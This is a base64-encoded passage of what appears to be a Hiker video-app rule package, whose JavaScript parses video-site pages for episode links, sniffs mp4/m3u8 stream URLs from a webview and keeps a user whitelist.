Fxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuoznuqfop6PmnpBcXFwiLFxcXCJwYXRoXFxcIjpcXFwicFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXFxcXFwidVxcXFxcXFwiKSk7XFxcXG5sZXQgbGlzdCA9IHN0b3JhZ2UwLmdldEl0ZW0oXFxcXFxcXCJ3aGl0ZVxcXFxcXFwiLCBbXSk7XFxcXG5sZXQgaW5XaGl0ZSA9IGxpc3QuaW5jbHVkZXModXJsKTtcXFxcbmxldCBkID0gW107XFxcXG5pZiAoIWluV2hpdGUpIHtcXFxcbiAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsKTtcXFxcbiAgICBsZXQgd2ViID0gZ2V0SXRlbSgnd2ViJywgJzAnKSA9PSBcXFxcXFxcIjFcXFxcXFxcIjtcXFxcbiAgICBsZXQgcnVsZSA9IGdldFBhcmFtKFxcXFxcXFwiclxcXFxcXFwiKTtcXFxcbiAgICBsZXQgcGFyc2UgPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvcGFyc2VcXFxcXFxcIik7XFxcXG4gICAgZCA9IHBhcnNlKHJ1bGUsIHdlYiwgdXJsLCBodG1sKTtcXFxcbn1cXFxcbmlmIChkLmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgLy/ljLnphY3lpLHotKVcXFxcbiAgICBsZXQgaXRlID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3VcXFxcXFxcIikoZ2V0UGFyYW0oXFxcXFxcXCJyXFxcXFxcXCIpLCBnZXRIb21lKHVybCkpO1xcXFxuICAgIGxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcXFxuICAgICAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcXFxuICAgICAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlKTtcXFxcbiAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICBsZXQganMyID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3g1YWlcXFxcXFxcIikoZ2V0UGFyYW0oXFxcXFxcXCJyXFxcXFxcXCIpLCB1cmwpO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6IHVybCxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCJmbG9hdCYmMTAwJVxcXFxcXFwiLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAganM6IGpzICsgXFxcXFxcXCI7XFxcXFxcXFxuXFxcXFxcXCIgKyBqczIsXFxcXG4gICAgICAgICAgICB1cmxJbnRlcmNlcHRvcjogaXRlLFxcXFxuICAgICAgICAgICAgY2FuQmFjazogdHJ1ZSxcXFxcbiAgICAgICAgICAgIGZsb2F0VmlkZW86IHRydWUsXFxcXG4gICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWVcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVcXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGlkOiB1cmxcXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuICAgIGlmICghaW5XaGl0ZSkge1xcXFxuICAgICAgICB0b2FzdChcXFxcXFxcIkFJ5Yy56YWN5aSx6LSl77yM5bey5L2/55SoWDXliqDovb1cXFxcXFxcIik7XFxcXG4gICAgfVxcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbn0gZWxzZSB7XFxcXG4gICAgc2V0UmVzdWx0KGQpO1xcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuS6jOe6p3BhcnNlXFxcIixcXFwicGF0aFxcXCI6XFxcInBhcnNlXFxcIixcXFwicnVsZVxcXCI6XFxcIiQuZXhwb3J0cyA9IGZ1bmN0aW9uKHJ1bGUsIHdlYiwgdXJsLCBodG1sKSB7XFxcXG4gICAgbGV0IGQgPSBbXTtcXFxcblxcXFxuICAgIGxldCBhbGlzdCA9IHBkZmEoaHRtbCwgXFxcXFxcXCJib2R5JiZhXFxcXFxcXCIpO1xcXFxuICAgIGxldCBhcnIgPSBhbGlzdC5tYXAoaXQgPT4ge1xcXFxuICAgICAgICByZXR1cm4ge1xcXFxuICAgICAgICAgICAgLy9odG1sOiBpdCxcXFxcbiAgICAgICAgICAgIHRleHQ6IHBkZmgoaXQsIFxcXFxcXFwiYSYmVGV4dFxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgIHRpdGxlOiBwZGZoKGl0LCBcXFxcXFxcImEmJnRpdGxlXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgaHJlZjogcGQoaXQsIFxcXFxcXFwiYSYmaHJlZlxcXFxcXFwiLCB1cmwpXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcbiAgICAvL2xvZyhhcnIpO1xcXFxuICAgIGxldCBkZWJ1ZyA9IGZhbHNlO1xcXFxuXFxcXG4gICAgZnVuY3Rpb24gY2xlYXJUZXh0KGl0KSB7XFxcXG4gICAgICAgIHJldHVybiBpdC5yZXBsYWNlKC/nrKx86ZuGfOeroC9nLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBmdW5jdGlvbiBpc01vdmllKGl0KSB7XFxcXG4gICAgICAgIGlmIChpdCA9PSBudWxsIHx8IGl0LnRleHQgPT0gbnVsbCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCB0aXQgPSBpdC50aXRsZSB8fCBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgaWYgKGl0ID09IFxcXFxcXFwiXFxcXFxcXCIgfHwgaXQubGVuZ3RoID4gOCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIC8v5o6S6ZmkXFxcXG4gICAgICAgIGxldCByZWcgPSAvXFxcXFxcXFwufOmrmOa4heebtOaSrXzlhpnnnJ/mjqjojZB85b2x6ZmifOW9seinhnzok53lhYnnlLXlvbF86auY5riF55S15b2xfOesrOS4gOWto3znrKzkuozlraN856ys5LiJ5a2jfOesrOWbm+Wto3znrKzkupTlraMvO1xcXFxuICAgICAgICBpZiAodGl0ICE9IFxcXFxcXFwiXFxcXFxcXCIgJiYgIXRpdC5pbmNsdWRlcyhpdCkgfHwgcmVnLnRlc3QoaXQpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIGl0Lm1hdGNoKC/ljp/nlLt85aSH55SofOiTneWFiXzotoXmuIV86auY5riFfOato+eJh3zpn6nniYh8NEt8NGt8MTA4MFB8NzIwUHxUQ3xIRHxCRC8pXFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gbm90Q2hhcHRlcihpdCkge1xcXFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBpdC50ZXh0Lm1hdGNoKC9bMC05XVxcXFxcXFxcLlswLTld5YiGLyk7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gaXNDaGFwdGVyKGl0LCBwcmUsIG5leHQpIHtcXFxcbiAgICAgICAgaWYgKG5vdENoYXB0ZXIoaXQpKSB7XFxcXG4gICAgICAgICAgICAvL+S8mOWFiOaOkumZpFxcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIC8v5Yik5pat5piv5LiN5piv55S15b2xXFxcXG4gICAgICAgIGlmIChpc01vdmllKGl0KSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIGlzQ2hhcHRlcjAoaXQsIHByZSkgfHwgaXNDaGFwdGVyMChpdCwgbmV4dCk7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gZ2V0Q2hhcHRlck51bShpdCkge1xcXFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgaWYgKGl0ID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpdCA9IGNsZWFyVGV4dChpdCk7XFxcXG4gICAgICAgIGxldCByZWcgPSAvXlswLTldKiQvO1xcXFxuICAgICAgICBpZiAoIXJlZy50ZXN0KGl0KSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGl0ID0gcGFyc2VJbnQoaXQpO1xcXFxuICAgICAgICBpZiAoaXNOYU4oaXQpKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKGl0ID4gMTkwMCAmJiBpdCA8IDIxMDApIHtcXFxcbiAgICAgICAgICAgIHJldHVybiAtMTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gaXQ7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgZnVuY3Rpb24gaXNDaGFwdGVyMChpdCwgYnJvdGhlcikge1xcXFxuICAgICAgICAvKmlmIChkZWJ1Zykge1xcXFxuICAgICAgICAgICAgbG9nKHtcXFxcbiAgICAgICAgICAgICAgICBpdDogaXQsXFxcXG4gICAgICAgICAgICAgICAgYnJvdGhlcjogYnJvdGhlclxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH0qL1xcXFxuICAgICAgICBpdCA9IGdldENoYXB0ZXJOdW0oaXQpO1xcXFxuICAgICAgICAvL2lmIChkZWJ1ZykgbG9nKGl0KTtcXFxcbiAgICAgICAgaWYgKGl0IDwgMCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGJyb3RoZXIgPSBnZXRDaGFwdGVyTnVtKGJyb3RoZXIpO1xcXFxuICAgICAgICAvL2lmIChkZWJ1ZykgbG9nKGJyb3RoZXIpO1xcXFxuICAgICAgICBpZiAoYnJvdGhlciA8IDApIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gaXQgLSBicm90aGVyIDwgMiAmJiBpdCAtIGJyb3RoZXIgPiAtMjtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBsZXQgX3dlYiA9ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBsZXQgdXJscyA9IF9nZXRVcmxzKCk7XFxcXG4gICAgICAgIGxldCByZWcgPSAvXFxcXFxcXFwuaHRtbHxcXFxcXFxcXC5jc3N8XFxcXFxcXFwuanMvO1xcXFxuICAgICAgICBmb3IgKGxldCBrIGluIHVybHMpIHtcXFxcbiAgICAgICAgICAgIGlmICghcmVnLnRlc3QodXJsc1trXSkgJiYgdXJsc1trXS5tYXRjaCgvXFxcXFxcXFwubXA0fFxcXFxcXFxcLm0zdTgvKSkge1xcXFxuICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKHVybHNba10pO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFxcXFxcIlxcXFxcXFwiKSkgKyBcXFxcXFxcIiNpZ25vcmVJbWc9dHJ1ZSNcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH0pO1xcXFxuXFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICBsZXQgdCA9IGl0LnRleHQ7XFxcXG4gICAgICAgIGlmICghaXQuaHJlZiB8fCBpdC5ocmVmID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCBwcmUgPSBpID09IDAgPyBudWxsIDogYXJyW2kgLSAxXTtcXFxcbiAgICAgICAgbGV0IG5leHQgPSBpID09IChhcnIubGVuZ3RoIC0gMSkgPyBudWxsIDogYXJyW2kgKyAxXTtcXFxcbiAgICAgICAgaWYgKGlzQ2hhcHRlcihpdCwgcHJlLCBuZXh0KSkge1xcXFxuICAgICAgICAgICAgaWYgKHdlYikge1xcXFxuICAgICAgICAgICAgICAgIHZhciB1cmx4ID0gXFxcXFxcXCJ3ZWJSdWxlOi8vXFxcXFxcXCIgKyBpdC5ocmVmICsgXFxcXFxcXCJAXFxcXFxcXCIgKyBfd2ViO1xcXFxuICAgICAgICAgICAgICAgIHZhciBleHRyYXggPSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWYsXFxcXG4gICAgICAgICAgICAgICAgICAgIGJsb2NrUnVsZXM6IFsnLm00YScsICcubXAzJywgJy5mbHYnLCAnLmF2aScsICcuM2dwJywgJy5tcGVnJywgJy53bXYnLCAnLm1vdicsICcucm12YicsICcuZ2lmJywgJy5qcGVnJywgJy5wbmcnLCAnLmljbycsICcuc3ZnJ11cXFxcbiAgICAgICAgICAgICAgICB9O1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICB2YXIgdXJseCA9IFxcXFxcXFwidmlkZW86Ly9cXFxcXFxcIiArIGl0LmhyZWY7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGV4dHJheCA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWZcXFxcbiAgICAgICAgICAgICAgICB9O1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogdCxcXFxcbiAgICAgICAgICAgICAgICB1cmw6IHVybHgsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8zXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IGV4dHJheFxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgaWYgKGQubGVuZ3RoID09IDApIHtcXFxcbiAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgfSBlbHNlIHtcXFxcblxcXFxuICAgICAgICBkLnNwbGljZSgwLCAwLCB7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLwn5SXXFxcXFxcXCIgKyB1cmwsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3lzZng/cnVsZT1cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIiZyPVxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiIyNcXFxcXFxcIiArIHVybCxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCJcXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcblxcXFxuICAgICAgICAvL+S4uue6v+i3r+WKoOWIhuWJsue6v1xcXFxuICAgICAgICBsZXQgZDIgPSBbXTtcXFxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBkLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICBkMi5wdXNoKGRbaV0pO1xcXFxuICAgICAgICAgICAgaWYgKGkgPCBkLmxlbmd0aCAtIDEpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBkW2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB0MSA9IHBhcnNlSW50KGNsZWFyVGV4dChpdC50aXRsZSkpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBuZXh0ID0gZFtpICsgMV07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHQyID0gcGFyc2VJbnQoY2xlYXJUZXh0KG5leHQudGl0bGUpKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAodDIgLSB0MSA+IDEgfHwgdDEgLSB0MiA+IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGQyLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yy56YWN5pyJ6K+v77yf54K55oiR5LiN5YaN5Yy56YWN5q2k6aG16Z2iXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgodXJsKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIua4qemmqOaPkOekulxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIuWmguaenOWPquaYr+WNleasoeWMuemFjeWksei0pe+8jOeCueWHu+S4i+aWueWPlua2iOaMiemSruWIt+aWsOmhtemdoumHjeaWsOWMuemFje+8jOWmguaenOehruiupOaXoOazleWMuemFje+8jOeCueWHu+S4i+aWueehruWumuaMiemSruWKoOWFpeeZveWQjeWNlVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBjYW5jZWw6IFxcXFxcXFwicmVmcmVzaFBhZ2UoKVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKCh1cmwpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBsaXN0ID0gc3RvcmFnZTAuZ2V0SXRlbShcXFxcXFxcIndoaXRlXFxcXFxcXCIsIFtdKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpc3QucHVzaCh1cmwpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgc3RvcmFnZTAuc2V0SXRlbShcXFxcXFxcIndoaXRlXFxcXFxcXCIsIGxpc3QpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey5Yqg5YWl55m95ZCN5Y2VXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSwgdXJsKVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgfSwgdXJsKSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImF2YXRhclxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgaW1nOiBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2FjY291bnRcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIGQyO1xcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCJ4NUFJXFxcIixcXFwicGF0aFxcXCI6XFxcIng1YWlcXFwiLFxcXCJydWxlXFxcIjpcXFwiJC5leHBvcnRzID0gZnVuY3Rpb24ocnVsZSwgYW5jaG9ySWQpIHtcXFxcbiAgICByZXR1cm4gJC50b1N0cmluZygocnVsZSwgYW5jaG9ySWQsIHdoaXRlKSA9PiB7XFxcXG4gICAgICAgIGlmICh3aW5kb3cuY2hlY2swID09IG51bGwpIHtcXFxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGNoZWNrMCgpIHtcXFxcbiAgICAgICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgaHRtbCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoXFxcXFxcXCJodG1sXFxcXFxcXCIpLmlubmVySFRNTDtcXFxcbiAgICAgICAgICAgICAgICAgICAgZmJhLnB1dFZhcihcXFxcXFxcImh0bWwwXFxcXFxcXCIsIGh0bWwpO1xcXFxuICAgICAgICAgICAgICAgICAgICBmYmEucGFyc2VMYXp5UnVsZUFzeW5jKCQkJCgpLmxhenlSdWxlKChydWxlLCB1cmwsIGFuY2hvcklkLCB3aGl0ZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBodG1sID0gZ2V0VmFyKFxcXFxcXFwiaHRtbDBcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJWYXIoXFxcXFxcXCJodG1sMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgd2ViID0gZmFsc2U7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCF3aGl0ZS5pbmNsdWRlcyh1cmwpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXJzZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9wYXJzZT9ydWxlPVxcXFxcXFwiICsgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBwYXJzZShydWxlLCB3ZWIsIHVybCwgaHRtbCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLmxlbmd0aCA8IDEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhcnIgPSBwZGZhKGh0bWwsIFxcXFxcXFwiYm9keSYmaWZyYW1lXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGFyci5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHNyYyA9IHBkZmgoYXJyWzBdLCBcXFxcXFxcImlmcmFtZSYmc3JjXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhcXFxcXFxcIuiOt+WPluWIsGlmcmFtZe+8mlxcXFxcXFwiICsgc3JjKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXdoaXRlLmluY2x1ZGVzKHNyYykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNyYyAmJiBzcmMuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikgJiYgIXNyYy5tYXRjaCgvXFxcXFxcXFwubXA0fFxcXFxcXFxcLm0zdTh8XFxcXFxcXFwubXAzfFxcXFxcXFxcLmZsdnxcXFxcXFxcXC5ta3YvKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHRtbCA9IHJlcXVlc3Qoc3JjKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGQgPSBwYXJzZShydWxlLCB3ZWIsIHNyYywgaHRtbCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhcXFxcXFxcIuWwneivleiOt+WPlmlmcmFtZeWksei0pVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZC5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRbMF0udXJsID0gJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChhbmNob3JJZCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRlc2MgPSBnZXRWYXIoYW5jaG9ySWQsIFxcXFxcXFwiMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkZXNjID09IFxcXFxcXFwiMFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFg1RGVzYyhcXFxcXFxcImZsb2F0JiZzY3JlZW4tMTcwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihhbmNob3JJZCwgXFxcXFxcXCIxXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoWDVEZXNjKFxcXFxcXFwiZmxvYXQmJjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKGFuY2hvcklkLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAg